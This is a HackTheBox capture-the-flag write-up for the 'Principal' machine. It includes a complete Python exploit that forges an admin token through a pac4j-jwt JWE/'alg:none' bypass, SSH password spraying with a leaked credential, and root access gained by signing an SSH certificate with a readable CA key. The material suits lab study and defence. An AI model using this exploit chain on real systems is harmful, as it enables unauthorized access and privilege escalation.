---
icon: user-hair-buns
cover: ../../../../.gitbook/assets/Screenshot 2026-03-13 000513.png
coverY: 6.996630018320843
---

# HTB-PRINCIPLE

### Reconnaissance

Alright so let's start. Machine name is "Principal" and the theme is "misplaced cryptographic trust" which basically screams "someone fucked up their crypto implementation." That's a solid hint to keep in mind.

Let me start with a rustscan to see what's listening:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ rustscan -a 10.129.5.120 BALH BLAH 
```

```
.----. .-. .-. .----..---.  .----. .---.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___}
| .-. \| {_} }.-._} } | |  .-._} }\     }
`-' `-'`-----'`----|`  `-'  `-----'  `---'

Port Scanning the hosts in file /tmp/hosts.txt
[~] The Nmap 'unknown-script' warning will NOT appear.
[~] exec nmap -p1-65535 -sV --script vuln 10.129.5.120

Host: 10.129.5.120
Ports: 22/open/ssh//OpenSSH 9.6p1 Ubuntu 3ubuntu13.14//, 8080/open/http-proxy//Jetty//
[~] Done: scan duration 23.22s

[+] Interesting ports for 10.129.5.120:
22/tcp   open ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open http    Jetty
```

Okay so two ports - SSH on 22 and HTTP on 8080 running Jetty. Pretty minimal attack surface, which usually means the exploit is going to be something subtle. Jetty is a Java web server, so this is probably a Java application.

Notice in the Nmap output it says `X-Powered-By: pac4j-jwt/6.0.3`. That's the real clue here. pac4j is a Java authentication/authorization framework, and JWT auth at version 6.0.3 is definitely something I should Google because there's probably a known vuln. Let me keep that in my back pocket and start poking at the web app.

***

### Enumeration

#### Web Application Reconnaissance

Let me hit the web app and see what we're working with:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ curl -s http://10.129.5.120:8080/ -L
```

<figure><img src="../../../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>

It redirects to `/login`. Opens a login page called "Principal Internal Platform" with username/password fields. Standard stuff. Footer says `v1.2.0 | Powered by pac4j`.

Now here's what I usually do when I see a login page - first I try default creds (admin/admin, etc.) but more importantly I look at the JavaScript source code because devs are lazy and sometimes leak useful info about the auth flow there.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ curl -s http://10.129.5.120:8080/static/js/app.js
```

```javascript
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 * sub - username
 * role - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 * iss - "principal-platform"
 * iat - issued at (epoch)
 * exp - expiration (epoch)
 */
const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
[...snip...]
```

Okay this is fucking gold. The JS literally tells us the entire auth flow:

1. User sends credentials to `/api/auth/login`
2. Server returns a **JWE token** (that's JWT wrapped in encryption - RSA-OAEP-256 + A128GCM)
3. Inside that JWE is another JWT that's signed with RS256
4. The public key is available at `/api/auth/jwks`

So the token structure is basically: **JWE(JWT)** - encrypted on the outside, signed on the inside.

Now here's where the vulnerability comes in. The code says "Public key available at /api/auth/jwks for token verification" - but which key? The signing key or the encryption key? Let me fetch it and see:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ curl -s http://10.129.5.120:8080/api/auth/jwks | jq
```

<figure><img src="../../../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

Aha! Notice the `kid` is `enc-key-1` - that's the **encryption key**, not the signing key. The signing key is probably private and not exposed. This is already suspicious because:

1. We have the encryption (RSA) key but not the signing key
2. The token is JWE-encrypted
3. The version is pac4j 6.0.3 which I'm pretty sure has CVE-2026-29000

Let me Google...&#x20;

<figure><img src="../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

yeah, CVE-2026-29000 is a critical JWT auth bypass in pac4j-jwt 6.0.3. The vulnerability is in how the library handles this JWE+JWS combo. Let me explain the flaw:

**CVE-2026-29000 Vulnerability Explained:**

When pac4j-jwt receives a JWE token, it:

1. Decrypts it using the private key (which the server has)
2. Extracts the inner payload
3. Calls `toSignedJWT()` on the inner payload
4. **If the inner payload is unsigned** (a PlainJWT with `{"alg":"none"}`), `toSignedJWT()` returns `null`
5. The code then checks `if (signedJWT != null)` before verifying the signature
6. **When signedJWT is null, the entire signature verification is skipped**

So the server says: "Is this JWE valid? Yes." But never says: "Is the JWT inside actually signed and valid? ...oh we don't check that."

This is exactly the kind of "misplaced trust" the machine description warned us about. The system trusts the cryptographic **envelope** (JWE decryption) but forgets to validate the **identity claim** inside (JWT signature).

***

### Exploitation

#### CVE-2026-29000: Forging an Admin Token

The attack is stupid simple once you understand the vuln:

1. Craft a PlainJWT (unsigned, with `{"alg":"none"}`) that has admin claims
2. Wrap it in a JWE encrypted with the server's public key (which we have)
3. Send it as a Bearer token
4. Server decrypts JWE ✓, tries to verify inner JWT signature, gets null, skips verification, accepts it
5. We're authenticated as admin

Let me write the exploit script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ cat > jwt_bypass.py << 'EOF'
#!/usr/bin/env python3
"""CVE-2026-29000 - pac4j-jwt Authentication Bypass"""
import json
import time
import base64
import requests
from jwcrypto import jwk, jwe
import sys

TARGET = "http://10.129.5.120:8080"

# Step 1: Fetch JWKS and extract the RSA public key
print("[*] Fetching JWKS...")
resp = requests.get(f"{TARGET}/api/auth/jwks")
jwks_data = resp.json()
key_data = jwks_data['keys'][0]
pub_key = jwk.JWK(**key_data)
print(f"[+] Got RSA public key (kid: {key_data['kid']})")

# Step 2: Craft a PlainJWT with admin claims
# This is the key - we're making an UNSIGNED JWT with alg: none
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())

# Header says alg is "none" - no signature
header = b64url_encode(json.dumps({"alg": "none"}).encode())

# Payload with admin role
payload = b64url_encode(json.dumps({
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}).encode())

# PlainJWT format: header.payload. (note the trailing dot with nothing after it)
plain_jwt = f"{header}.{payload}."
print(f"[*] Crafted unsigned PlainJWT with admin claims")
print(f"    sub: admin")
print(f"    role: ROLE_ADMIN")

# Step 3: Wrap the PlainJWT in JWE encryption using server's public key
# This is important - we're encrypting our unsigned JWT with their public key
jwe_token = jwe.JWE(
    plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": key_data['kid'],
        "cty": "JWT"  # Content type is JWT
    })
)
forged_token = jwe_token.serialize(compact=True)
print(f"[+] Wrapped in JWE (RSA-OAEP-256 + A128GCM)")

# Step 4: Test the forged token on /api/dashboard
headers = {"Authorization": f"Bearer {forged_token}"}
print(f"\n[*] Testing forged token on /api/dashboard...")
resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(f"[+] Response status: {resp.status_code}")

if resp.status_code == 200:
    data = resp.json()
    print(f"[+] SUCCESS! Authenticated as: {data['user']['username']} ({data['user']['role']})")
    print(f"\n[+] FORGED ADMIN TOKEN:")
    print(forged_token)
    print("\n[!] This token can now be used for any authenticated request\n")
else:
    print(f"[-] Failed to authenticate: {resp.text}")
EOF
```

Now let's run it:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ python3 jwt_bypass.py
```

<figure><img src="../../../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>

Boom. Authenticated as admin. The vulnerability worked exactly as expected. Server decrypted the JWE, saw an unsigned JWT inside, and never bothered checking if it was actually signed.

#### Extracting Credentials from the Dashboard

Now that we're authenticated as admin, let's see what secrets are available in the dashboard. First let me save this token for future use:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ TOKEN="eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9.Y5M1vQ...<SNIP>"
```

Let me check the `/api/users` endpoint to get a list of all users:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ curl -s -H "Authorization: Bearer $TOKEN" http://10.129.5.120:8080/api/users | jq
```

<figure><img src="../../../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>

Good! We have a list of usernames. Now let me check the settings for any credentials or secrets:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ curl -s -H "Authorization: Bearer $TOKEN" http://10.129.5.120:8080/api/settings | jq
```

```json
{
  "infrastructure": {
    "sshCaPath": "/opt/principal/ssh/",
    "sshCertAuth": "enabled",
    "database": "H2 (embedded)",
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
  },
  "integrations": [
    {
      "name": "GitLab CI/CD",
      "lastSync": "2025-12-28T12:00:00Z",
      "status": "connected"
    },
    {
      "name": "Vault",
      "lastSync": "2025-12-28T14:00:00Z",
      "status": "connected"
    },
    {
      "name": "Prometheus",
      "lastSync": "2025-12-28T14:30:00Z",
      "status": "connected"
    }
  ],
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!",
    "tokenExpiry": "3600s",
    "sessionManagement": "stateless"
  },
  "system": {
    "version": "1.2.0",
    "environment": "production",
    "serverType": "Jetty 12.x (Embedded)",
    "javaVersion": "21.0.10",
    "applicationName": "Principal Internal Platform"
  }
}

```

<figure><img src="../../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

Perfect. We found a password: `D3pl0y_$$H_Now42!`

And there's a note about SSH certificate auth being configured and the CA being in `/opt/principal/ssh`. That's interesting - probably gonna be relevant for privilege escalation.

The password is for `sshDecryption` which suggests it's used for SSH-related stuff. Looking at the user notes, `svc-deploy` is for "automated deployments via SSH certificate auth" so this password might work for that account.

Let me create a list of usernames and try password spraying on SSH:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ cat > users.txt << 'EOF'
admin
svc-deploy
svc-display
jthompson
amorales
bwright
lkumar
mwilson
uzhang
EOF
```

Now let's spray with netexec (nxc):

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ nxc ssh 10.129.5.120 -u users.txt -p 'D3pl0y_$$H_Now42!' --no-bruteforce
```

<figure><img src="../../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

Boom. `svc-deploy` user has shell access with this password. That's our foothold.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Principal]
└─$ ssh svc-deploy@10.129.5.120
```

<figure><img src="../../../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

Got the user flag. Now time for privilege escalation.

***

### Privilege Escalation

#### Initial Enumeration for Privesc

First thing I always check after getting a shell:

```bash
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

So we're in the `deployers` group. That's probably important. Let me look for files owned by this group:

```bash
svc-deploy@principal:~$ find / -group deployers 2>/dev/null
```

<figure><img src="../../../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>

Interesting. An SSH CA (Certificate Authority) directory that our `deployers` group can access. Let me check what's in there:

```bash
svc-deploy@principal:~$ ls -la /opt/principal/ssh/
```

<figure><img src="../../../../.gitbook/assets/image (623).png" alt=""><figcaption></figcaption></figure>

Hold on. We can **read the CA private key** (`ca`). That's huge. Let me check the README:

```bash
svc-deploy@principal:/opt/principal/ssh$ cat README.txt
```

<figure><img src="../../../../.gitbook/assets/image (624).png" alt=""><figcaption></figcaption></figure>

So the system uses SSH certificates. The CA is trusted by sshd. Now let me check the sshd configuration to understand how it validates certificates:

```bash
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

Okay so here's what's happening:

* `PermitRootLogin prohibit-password` means we can't SSH as root with a password
* **BUT** `TrustedUserCAKeys` is set, which means we CAN use certificate-based auth

Now here's the critical part: look at what's **missing**. There's no `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` configured.

#### Understanding the SSH CA Vulnerability

When OpenSSH has `TrustedUserCAKeys` configured but **no principal validation**, here's what happens:

1. Client sends SSH key + certificate
2. sshd checks: "Is this certificate signed by our trusted CA?" → **If yes, accept it**
3. sshd matches the **principal field in the certificate** with the username being logged into
4. If they match, authentication succeeds

The vulnerability is: **We control the CA private key.** So we can sign a certificate with **any principal we want**  including `root`.

This is the same pattern as the JWT bypass earlier: the system validates the **cryptographic envelope** (certificate is properly signed) but never validates the **identity claim** inside (the principal field).

#### SSH Certificate Forgery Attack

Let me generate a new SSH key pair:

```bash
svc-deploy@principal:~$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""
```

```
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/pwn
Your public key has been saved in /tmp/pwn.pub
The key fingerprint is:
SHA256:O2cCVJxbH7lVvItnsgrmQhfU/PyMue9BsfnITmYaT1Y
The randomart image is:
+--[ED25519 256]--+
|    .o+.         |
|   .E + o        |
|  . o * o .      |
| o . * * o       |
|  o + O S .      |
|   . o B =       |
|      o = +      |
|       + . .     |
|        o.o      |
+----[SHA256]-----+
```

Now here's the magic part - sign this public key with the CA private key, but specify `root` as the principal:

```bash
svc-deploy@principal:~$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
```

```
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from 2026-03-11T15:00:00 to 2026-03-11T16:01:53
```

Let me verify the certificate to make sure it has the `root` principal:

```bash
svc-deploy@principal:~$ ssh-keygen -L -f /tmp/pwn-cert.pub
```

```
/tmp/pwn-cert.pub:
	Type: ssh-ed25519-cert-v01@openssh.com user certificate
	Public key: ED25519-CERT 
	SHA256:O2cCVJxbH7lVvItnsgrmQhfU/PyMue9BsfnITmYaT1Y
	Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps (using 
	rsa-sha2-512)
	Key ID: "pwn-root"
	Serial: 0
	Valid: from 2026-03-11T15:00:00 to 2026-03-11T16:01:53
	Principals: 
		root
	Critical Options: (none)
	Extensions: 
		permit-X11-forwarding
		permit-agent-forwarding
		permit-port-forwarding
		permit-pty
		permit-user-rc
```

Perfect. The certificate clearly shows:

* **Principals: root** - this is what we forged
* It's signed by the CA key
* It's valid for 1 hour

Now let's use it to SSH as root:

```bash
svc-deploy@principal:~$ ssh -i /tmp/pwn root@localhost
```

<figure><img src="../../../../.gitbook/assets/image (625).png" alt=""><figcaption></figcaption></figure>

We're root. Machine pwned.

#### Why This Worked

The vulnerability chain is beautiful actually:

1. **First flaw (JWT)**: Server validates the JWE encryption but doesn't validate if the inner JWT is signed
2. **Second flaw (SSH CA)**: sshd validates the certificate signature but doesn't validate if the principal claim matches the actual user being authenticated

Both are examples of "we trust the crypto but not the claims" - it's crypto done badly. The system designer said "if it's cryptographically valid, it must be trusted" but forgot that crypto only validates the container, not the contents.

***

### Attack Flow

<figure><img src="../../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

***

### Vulnerabilities Explained

#### CVE-2026-29000: JWT Authentication Bypass

**Root Cause**: pac4j's `JwtAuthenticator.validate()` method has flawed null checking:

```
1. JWE decrypted with private key → inner payload extracted
2. toSignedJWT(payload) called on inner content
3. If payload is PlainJWT ({"alg":"none"}), returns null
4. Code checks: if (signedJWT != null) verifySignature()
5. null case → signature verification skipped entirely
```

The vulnerability is that **decryption success ≠ authenticity verification**. JWE only provides confidentiality. JWT signature provides authenticity. The library conflated the two.

**Attack**: Craft `PlainJWT(alg:none) + admin_claims` → wrap in JWE with public key → server trusts the envelope, skips signature check → forged token accepted.

#### SSH CA Principal Validation Failure

**Root Cause**: sshd with `TrustedUserCAKeys` but no `AuthorizedPrincipalsFile`:

```
OpenSSH Certificate Validation:
1. Check certificate signature against trusted CA key ✓
2. Extract principal field from certificate
3. Match principal against requested username
4. If no AuthorizedPrincipalsFile: principal must match username exactly
```

**BUT** we control the CA private key, so we can issue certificates with any principal. No validation happens on the principal claim itself.

**Attack**: Sign certificate with principal=root → SSH root@host → certificate signature valid, principal matches requested user → access granted.

#### Common Pattern

Both vulnerabilities follow the same anti-pattern:

* **Verify cryptographic envelope** (JWE decrypt, certificate signature valid)
* **Ignore identity claim** (JWT payload authenticity, certificate principal)

Crypto validates "is this signed properly?" but doesn't validate "who is this claim for?"

***

### References

* **CVE-2026-29000**: pac4j-jwt v6.0.3 JWE/JWS bypass

{% embed url="https://arcticwolf.com/resources/blog/cve-2026-29000/" %}

***

### In Short

1. **Never trust encryption alone** - just because something decrypts doesn't mean it's authentic
2. **Validate claims, not just containers** - cryptographic verification of the envelope ≠ verification of the identity inside
3. **Auth configs can leak in JavaScript** - always read the source code
4. **Group membership is a privesc path** - if you're in a group with special file access, exploit it
5. **SSH CAs are powerful but dangerous** - without principal validation, anyone with the CA key can forge access for any user



<figure><img src="../../../../.gitbook/assets/complete (38).gif" alt=""><figcaption></figcaption></figure>
